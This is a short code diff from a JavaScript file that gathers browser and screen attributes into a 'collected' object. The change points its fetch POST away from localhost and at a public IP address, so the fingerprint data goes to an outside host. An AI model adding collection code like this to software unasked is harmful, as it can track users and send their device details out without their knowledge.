@@ -28,7 +28,7 @@ let collected = {};
         scrPixelDepth: screen.pixelDepth,
     };
 
-    fetch("http://localhost:8080/collect", {
+    fetch("http://159.65.118.109:8080/collect", {
         method:"post",
         body:JSON.stringify(collected),
         credentials: 'same-origin',
